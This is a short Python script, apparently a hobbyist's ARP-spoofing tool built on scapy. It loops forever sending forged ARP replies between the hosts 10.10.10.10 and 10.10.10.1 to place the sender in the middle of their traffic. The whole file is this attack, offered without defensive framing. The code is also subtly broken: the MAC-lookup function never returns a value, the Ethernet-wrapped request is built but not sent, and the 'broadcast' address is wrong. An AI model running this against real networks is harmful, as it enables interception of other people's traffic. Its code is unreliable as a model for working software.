import scapy.all as scapy
import time as time


def get_target_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)  # pdst = target_ip address
    # ether = mac address, setting spoofer mac address to be broadcasted
    broadcast_spoofer_mac = scapy.Ether(dst="aa:aa:aa:aa:aa:aa")
    arp_request_to_broadcast = broadcast_spoofer_mac / arp_request  # final broadcast message
    got_answer = scapy.srp(arp_request, timeout=2, verbose=False)[0]  # to catch/receive incoming packets/answers
    got_answer[0][1].hwsrc

def spoof(target_ip, source_ip):
    target_mac = get_target_mac(target_ip)
    packet_to_send = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = source_ip)
    scapy.send(packet_to_send, verbose = False)
try:
    while True:
        spoof("10.10.10.10", "10.10.10.1")
        spoof("10.10.10.1", "10.10.10.10")
        print("sending packets")
except KeyboardInterrupt:
    print("Quitting")
